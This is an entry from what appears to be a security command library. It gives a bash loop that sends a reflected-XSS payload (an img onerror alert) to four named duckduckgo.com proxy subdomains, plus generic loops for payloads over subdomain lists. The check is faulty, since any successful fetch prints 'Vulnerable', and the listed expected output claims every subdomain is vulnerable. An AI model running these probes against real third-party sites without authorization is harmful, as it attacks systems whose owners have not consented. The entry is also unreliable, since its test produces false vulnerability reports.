---
id: cmd-curl-test-xss-subdomain
data: >-
  for sub in proxy1 proxy2 proxy3 proxy4; do curl -s
  "https://${sub}.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E"
  > /dev/null && echo "$sub: Vulnerable"; done
tags:
  - xss
  - batch-testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:37.474Z'
verified: false
validated: true
submitted: true
---
# curl-test-xss-subdomain

## Command

```bash
for sub in proxy1 proxy2 proxy3 proxy4; do curl -s "https://${sub}.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E" > /dev/null && echo "$sub: Vulnerable"; done
```

## Description

Batch tests XSS payload across subdomains by looping curl fetches.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for sub in ...` | Loop over subdomains | Yes |
| `${sub}` | Variable insertion | Yes |

## Examples

### Basic Usage

```bash
for sub in sub1 sub2; do curl -s https://${sub}.com > /dev/null; done
```

### Advanced Usage

```bash
for sub in $(cat subs.txt); do curl -s "https://${sub}/page?payload" && echo $sub; done
```

## Expected Output

proxy1: Vulnerable
proxy2: Vulnerable
etc.

## Related

- [[Related Procedure]]
